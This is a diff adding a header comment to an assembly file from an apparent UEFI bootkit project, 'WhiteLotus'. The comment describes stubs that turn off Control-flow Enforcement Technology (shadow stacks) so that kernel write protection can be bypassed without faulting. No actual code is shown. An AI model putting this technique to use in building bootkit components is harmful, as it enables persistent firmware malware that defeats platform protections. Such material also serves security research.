@@ -1,3 +1,25 @@
+; ============================================================
+;  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+;  File     : Cet.asm
+; ============================================================
+;
+;  Description:
+;    x64 MASM stubs that directly manipulate CR4.CET and
+;    MSR_S_CET to disable and re-enable Control-flow
+;    Enforcement Technology (CET / Shadow Stack). Exported as
+;    AsmDisableCet and AsmEnableCet, called by Utils.c around
+;    CR0.WP-clearing operations that would fault on UEFI
+;    firmware with CET enforcement active.
+;
+;  Purpose:
+;    - Allow safe write-protect bypass on CET-enabled UEFI
+;      firmware without triggering a #CP exception.
+;
+;  Author   : 0xbekoo
+;  Blog     : https://0xbekoo.github.io
+;  Updated  : 2026-05-21
+;
+; ============================================================
 
 OPTION CASEMAP:NONE
 
